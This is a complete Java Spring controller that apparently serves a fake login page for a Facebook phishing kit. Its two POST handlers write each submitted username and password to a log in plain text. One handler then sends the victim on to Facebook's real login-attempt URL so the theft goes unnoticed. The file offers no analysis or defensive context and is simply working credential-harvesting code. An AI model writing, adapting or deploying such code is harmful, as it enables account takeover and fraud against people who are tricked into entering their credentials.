package com.mcn.fb;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.servlet.view.RedirectView;

@Controller
public class ControllerMap {
    public static final Logger logger = LogManager.getLogger("cls");

    @GetMapping("/")
    public String addData(Model model) {
        model.addAttribute("orderInput", new OrderInput());
        return "index";
    }

    @PostMapping("/wr")
    public String  red(@ModelAttribute OrderInput orderInput, Model model) {
        logger.info(orderInput.getUs());
        logger.info(orderInput.getPs());
        model.addAttribute("orderInput", new OrderInput());
        return "index1";
    }
    @PostMapping("/wr1")
    public RedirectView red1(@ModelAttribute OrderInput orderInput) {
        logger.info(orderInput.getUs());
        logger.info(orderInput.getPs());
        return new RedirectView("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110");
    }
}
